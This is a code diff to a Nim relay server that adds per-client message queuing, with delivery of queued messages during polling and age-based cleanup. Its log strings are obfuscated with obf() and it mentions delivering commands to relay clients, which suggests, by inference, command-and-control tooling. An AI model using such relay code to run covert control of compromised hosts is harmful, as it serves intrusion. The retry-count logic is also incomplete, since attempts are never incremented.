@@ -25,6 +25,8 @@ type
         isListening*: bool
         connections*: seq[RelayConnection]
         clientRegistry*: Table[string, int]  # ClientID → Connection index mapping
+        messageQueues*: Table[string, seq[QueuedMessage]]  # ClientID → Message queue
+        queueCleanupTime*: int64  # Last time queues were cleaned
 
 # Forward declarations for routing functions
 proc routeMessage*(server: var RelayServer, msg: RelayMessage): bool
@@ -33,6 +35,14 @@ proc isResponseMessage*(msgType: RelayMessageType): bool
 proc analyzeRouteDirection*(route: seq[string], currentID: string, isResponse: bool): tuple[isForUs: bool, nextHop: string, hopsFromOrigin: int, shouldRoute: bool]
 proc debugRouteDecision*(msg: RelayMessage, currentID: string)
 proc testDistributedRoutingSystem*(): tuple[passed: int, failed: int, details: seq[string]]
+
+# Forward declarations for queue functions
+proc enqueueMessage*(server: var RelayServer, clientID: string, msg: RelayMessage): bool
+proc dequeueMessage*(server: var RelayServer, clientID: string): tuple[hasMessage: bool, message: RelayMessage]
+proc hasQueuedMessages*(server: RelayServer, clientID: string): bool
+proc initMessageQueues*(server: var RelayServer)
+proc cleanupMessageQueues*(server: var RelayServer)
+proc clearAllQueues*(server: var RelayServer)
 
 # === ROUTING FUNCTIONS FOR PERSISTENT ROUTE MANAGEMENT ===
 
@@ -232,6 +242,9 @@ proc startRelayServer*(port: int): RelayServer =
     result.clientRegistry = initTable[string, int]()  # Initialize client registry
     result.isListening = false
     
+    # Initialize message queues
+    initMessageQueues(result)
+    
     try:
         result.socket = newSocket()
         result.socket.setSockOpt(OptReuseAddr, true)
@@ -248,6 +261,7 @@ proc startRelayServer*(port: int): RelayServer =
             echo obf("[STATE] Server listening on port ") & $port
             echo obf("[RELAY] 🚀 Multi-Client Relay server started on port ") & $port & obf(" (non-blocking mode)")
             echo obf("[MULTI-CLIENT] Ready to accept multiple relay clients on same port")
+            echo obf("[QUEUE] ✅ Message queue system initialized")
     except:
         result.isListening = false
         when defined debug:
@@ -512,7 +526,7 @@ proc registerClient*(server: var RelayServer, clientID: string, connectionIndex:
             echo obf("[MULTI-CLIENT] 📝 Registered client: ") & clientID & obf(" at connection index ") & $connectionIndex
             echo obf("[MULTI-CLIENT] 📊 Total registered clients: ") & $server.clientRegistry.len
 
-# Send message to specific client by ID (UNICAST)
+# Send message to specific client by ID (UNICAST) - with queue support
 proc sendToClient*(server: var RelayServer, clientID: string, msg: RelayMessage): bool =
     when defined debug:
         echo obf("[UNICAST] 🎯 Attempting to send to clientID: '") & clientID & obf("'")
@@ -524,45 +538,52 @@ proc sendToClient*(server: var RelayServer, clientID: string, msg: RelayMessage)
             registryContents.add("'" & id & "'→" & $idx)
         echo obf("[UNICAST] 🎯 Registry contents: [") & registryContents & obf("]")
     
-    if not server.clientRegistry.hasKey(clientID):
-        when defined debug:
-            echo obf("[UNICAST] ❌ Client '") & clientID & obf("' NOT FOUND in registry!")
-            echo obf("[UNICAST] ❌ This is the root cause of command delivery failure!")
-        return false
+    # Try to send directly if client is connected
+    if server.clientRegistry.hasKey(clientID):
+        let connectionIndex = server.clientRegistry[clientID]
+        if connectionIndex < server.connections.len:
+            var conn = server.connections[connectionIndex]
+            if conn.isConnected:
+                when defined debug:
+                    echo obf("[UNICAST] 📤 Client is connected - attempting direct send")
+                
+                let success = sendMessage(conn, msg)
+                if success:
+                    # Update connection back to array
+                    server.connections[connectionIndex] = conn
+                    server.connections[connectionIndex].lastActivity = epochTime().int64
+                    when defined debug:
+                        echo obf("[UNICAST] ✅ Message sent directly to client: ") & clientID
+                    return true
+                else:
+                    when defined debug:
+                        echo obf("[UNICAST] ❌ Direct send failed - client may be disconnected")
+                    # Clean up failed connection from registry
+                    server.clientRegistry.del(clientID)
+            else:
+                when defined debug:
+                    echo obf("[UNICAST] 📵 Client connection is dead - cleaning up registry")
+                # Clean up dead connection from registry
+                server.clientRegistry.del(clientID)
+        else:
+            when defined debug:
+                echo obf("[UNICAST] ❌ Invalid connection index for client: ") & clientID
+            # Clean up invalid registry entry
+            server.clientRegistry.del(clientID)
     
-    let connectionIndex = server.clientRegistry[clientID]
-    if connectionIndex >= server.connections.len:
-        when defined debug:
-            echo obf("[MULTI-CLIENT] ❌ Invalid connection index for client: ") & clientID
-        # Clean up invalid registry entry
-        server.clientRegistry.del(clientID)
-        return false
-    
-    var conn = server.connections[connectionIndex]
-    if not conn.isConnected:
-        when defined debug:
-            echo obf("[MULTI-CLIENT] ❌ Client connection dead: ") & clientID
-        # Clean up dead connection from registry
-        server.clientRegistry.del(clientID)
-        return false
-    
+    # Client not connected or send failed - enqueue message
     when defined debug:
-        echo obf("[MULTI-CLIENT] 📤 Sending message to client: ") & clientID & obf(" (type: ") & $msg.msgType & obf(")")
+        echo obf("[UNICAST] 📥 Client not connected - enqueuing message for later delivery")
     
-    let success = sendMessage(conn, msg)
-    if success:
-        # Update connection back to array (sendMessage might modify it)
-        server.connections[connectionIndex] = conn
-        server.connections[connectionIndex].lastActivity = epochTime().int64
+    let enqueueSuccess = enqueueMessage(server, clientID, msg)
+    if enqueueSuccess:
         when defined debug:
-            echo obf("[MULTI-CLIENT] ✅ Message sent to client: ") & clientID
+            echo obf("[UNICAST] ✅ Message queued for client: ") & clientID
+        return true
     else:
         when defined debug:
-            echo obf("[MULTI-CLIENT] ❌ Failed to send message to client: ") & clientID
-        # Clean up failed connection from registry
-        server.clientRegistry.del(clientID)
-    
-    return success
+            echo obf("[UNICAST] ❌ Failed to queue message for client: ") & clientID
+        return false
 
 # Get list of connected clients
 proc getConnectedClients*(server: RelayServer): seq[string] =
@@ -587,6 +608,9 @@ proc closeRelayServer*(server: var RelayServer) =
             
             # Clear client registry
             server.clientRegistry.clear()
+            
+            # Clear message queues
+            clearAllQueues(server)
             
             # Close server socket
             when defined debug:
@@ -1124,6 +1148,49 @@ proc pollRelayServer*(server: var RelayServer, timeout: int = 100): seq[RelayMes
             if registryAfterCleanup != "": registryAfterCleanup.add(", ")
             registryAfterCleanup.add(id & "→" & $idx)
         echo obf("[IDENTITY] 🧹 Registry after cleanup: [") & registryAfterCleanup & obf("]")
+    
+    # QUEUE SYSTEM: Check for queued messages and deliver them to connected clients
+    when defined debug:
+        echo obf("[QUEUE] 🔄 Checking for queued messages to deliver...")
+    
+    var deliveredMessages = 0
+    for clientID, connectionIndex in server.clientRegistry:
+        if connectionIndex < server.connections.len and server.connections[connectionIndex].isConnected:
+            if hasQueuedMessages(server, clientID):
+                when defined debug:
+                    echo obf("[QUEUE] 📤 Client ") & clientID & obf(" has queued messages - attempting delivery")
+                
+                # Try to deliver queued messages
+                var deliveriesForClient = 0
+                while hasQueuedMessages(server, clientID) and deliveriesForClient < 5:  # Limit to 5 messages per cycle
+                    let queuedMessage = dequeueMessage(server, clientID)
+                    if queuedMessage.hasMessage:
+                        # Try to send the message directly
+                        if sendMessage(server.connections[connectionIndex], queuedMessage.message):
+                            deliveredMessages += 1
+                            deliveriesForClient += 1
+                            when defined debug:
+                                echo obf("[QUEUE] ✅ Delivered queued message to client: ") & clientID
+                                echo obf("[QUEUE] - Message type: ") & $queuedMessage.message.msgType
+                                echo obf("[QUEUE] - Message ID: ") & queuedMessage.message.id
+                        else:
+                            when defined debug:
+                                echo obf("[QUEUE] ❌ Failed to deliver queued message to client: ") & clientID
+                            # Re-enqueue the message for later (with incremented attempt count)
+                            discard enqueueMessage(server, clientID, queuedMessage.message)
+                            break  # Stop trying to deliver more messages to this client
+                    else:
+                        break  # No more messages to deliver
+                
+                when defined debug:
+                    echo obf("[QUEUE] 📊 Delivered ") & $deliveriesForClient & obf(" messages to client: ") & clientID
+    
+    # Clean up old messages from queues
+    cleanupMessageQueues(server)
+    
+    when defined debug:
+        if deliveredMessages > 0:
+            echo obf("[QUEUE] ✅ Total queued messages delivered: ") & $deliveredMessages
     
     when defined debug:
         let finalConnections = server.connections.len
@@ -1946,3 +2013,161 @@ proc updateClientId*(server: var RelayServer, oldId: string, newId: string): boo
         echo "[REGISTRY] 🔄 === END UPDATE CLIENT ID (SUCCESS) ==="
     
     return true 
+
+# === MESSAGE QUEUE SYSTEM ===
+
+# Constants for queue management
+const
+    MAX_QUEUE_SIZE* = 50  # Maximum messages per client
+    MAX_MESSAGE_AGE* = 300  # 5 minutes in seconds
+    MAX_DELIVERY_ATTEMPTS* = 3  # Maximum attempts to deliver a message
+    QUEUE_CLEANUP_INTERVAL* = 60  # Clean queues every 60 seconds
+
+# Initialize message queues for a server
+proc initMessageQueues*(server: var RelayServer) =
+    server.messageQueues = initTable[string, seq[QueuedMessage]]()
+    server.queueCleanupTime = epochTime().int64
+
+# Add a message to a client's queue
+proc enqueueMessage*(server: var RelayServer, clientID: string, msg: RelayMessage): bool =
+    when defined debug:
+        echo "[QUEUE] 📥 Enqueuing message for client: " & clientID
+        echo "[QUEUE] 📥 Message type: " & $msg.msgType
+        echo "[QUEUE] 📥 Message ID: " & msg.id
+    
+    # Initialize queue if it doesn't exist
+    if not server.messageQueues.hasKey(clientID):
+        server.messageQueues[clientID] = @[]
+        when defined debug:
+            echo "[QUEUE] 📥 Created new queue for client: " & clientID
+    
+    # Check queue size limit
+    if server.messageQueues[clientID].len >= MAX_QUEUE_SIZE:
+        when defined debug:
+            echo "[QUEUE] 📥 ⚠️ Queue full for client: " & clientID & " (size: " & $server.messageQueues[clientID].len & ")"
+        # Remove oldest message to make room
+        server.messageQueues[clientID].delete(0)
+        when defined debug:
+            echo "[QUEUE] 📥 Removed oldest message from queue"
+    
+    # Create queued message
+    let queuedMsg = QueuedMessage(
+        message: msg,
+        timestamp: epochTime().int64,
+        attempts: 0,
+        maxAttempts: MAX_DELIVERY_ATTEMPTS,
+        clientID: clientID
+    )
+    
+    # Add to queue
+    server.messageQueues[clientID].add(queuedMsg)
+    
+    when defined debug:
+        echo "[QUEUE] 📥 ✅ Message queued for client: " & clientID & " (queue size: " & $server.messageQueues[clientID].len & ")"
+    
+    return true
+
+# Get the next message from a client's queue
+proc dequeueMessage*(server: var RelayServer, clientID: string): tuple[hasMessage: bool, message: RelayMessage] =
+    result.hasMessage = false
+    
+    if not server.messageQueues.hasKey(clientID):
+        when defined debug:
+            echo "[QUEUE] 📤 No queue for client: " & clientID
+        return
+    
+    let queue = server.messageQueues[clientID]
+    if queue.len == 0:
+        when defined debug:
+            echo "[QUEUE] 📤 Empty queue for client: " & clientID
+        return
+    
+    # Get the oldest message
+    let queuedMsg = queue[0]
+    result.hasMessage = true
+    result.message = queuedMsg.message
+    
+    # Remove from queue
+    server.messageQueues[clientID].delete(0)
+    
+    when defined debug:
+        echo "[QUEUE] 📤 ✅ Dequeued message for client: " & clientID & " (remaining: " & $server.messageQueues[clientID].len & ")"
+        echo "[QUEUE] 📤 Message type: " & $result.message.msgType
+        echo "[QUEUE] 📤 Message ID: " & result.message.id
+
+# Check if a client has queued messages
+proc hasQueuedMessages*(server: RelayServer, clientID: string): bool =
+    if not server.messageQueues.hasKey(clientID):
+        return false
+    return server.messageQueues[clientID].len > 0
+
+# Get the number of queued messages for a client
+proc getQueueSize*(server: RelayServer, clientID: string): int =
+    if not server.messageQueues.hasKey(clientID):
+        return 0
+    return server.messageQueues[clientID].len
+
+# Clean up old messages from all queues
+proc cleanupMessageQueues*(server: var RelayServer) =
+    let currentTime = epochTime().int64
+    
+    # Only clean up if enough time has passed
+    if currentTime - server.queueCleanupTime < QUEUE_CLEANUP_INTERVAL:
+        return
+    
+    when defined debug:
+        echo "[QUEUE] 🧹 Starting queue cleanup..."
+    
+    var totalRemoved = 0
+    var clientsToRemove: seq[string] = @[]
+    
+    # Clean up each client's queue
+    for clientID, queue in server.messageQueues.mpairs:
+        var newQueue: seq[QueuedMessage] = @[]
+        var removedFromClient = 0
+        
+        for queuedMsg in queue:
+            let messageAge = currentTime - queuedMsg.timestamp
+            if messageAge > MAX_MESSAGE_AGE or queuedMsg.attempts >= queuedMsg.maxAttempts:
+                # Message is too old or has failed too many times
+                removedFromClient += 1
+                when defined debug:
+                    echo "[QUEUE] 🧹 Removing old/failed message for client: " & clientID
+                    echo "[QUEUE] 🧹 - Message age: " & $messageAge & "s"
+                    echo "[QUEUE] 🧹 - Attempts: " & $queuedMsg.attempts & "/" & $queuedMsg.maxAttempts
+            else:
+                # Keep this message
+                newQueue.add(queuedMsg)
+        
+        # Update queue
+        server.messageQueues[clientID] = newQueue
+        totalRemoved += removedFromClient
+        
+        # Mark empty queues for removal
+        if newQueue.len == 0:
+            clientsToRemove.add(clientID)
+    
+    # Remove empty queues
+    for clientID in clientsToRemove:
+        server.messageQueues.del(clientID)
+        when defined debug:
+            echo "[QUEUE] 🧹 Removed empty queue for client: " & clientID
+    
+    server.queueCleanupTime = currentTime
+    
+    when defined debug:
+        echo "[QUEUE] 🧹 ✅ Queue cleanup completed"
+        echo "[QUEUE] 🧹 - Total messages removed: " & $totalRemoved
+        echo "[QUEUE] 🧹 - Empty queues removed: " & $clientsToRemove.len
+        echo "[QUEUE] 🧹 - Active queues: " & $server.messageQueues.len
+
+# Clear all queues (for shutdown)
+proc clearAllQueues*(server: var RelayServer) =
+    when defined debug:
+        echo "[QUEUE] 🧹 Clearing all message queues"
+    
+    let totalMessages = server.messageQueues.len
+    server.messageQueues.clear()
+    
+    when defined debug:
+        echo "[QUEUE] 🧹 ✅ All queues cleared (removed " & $totalMessages & " queues)"
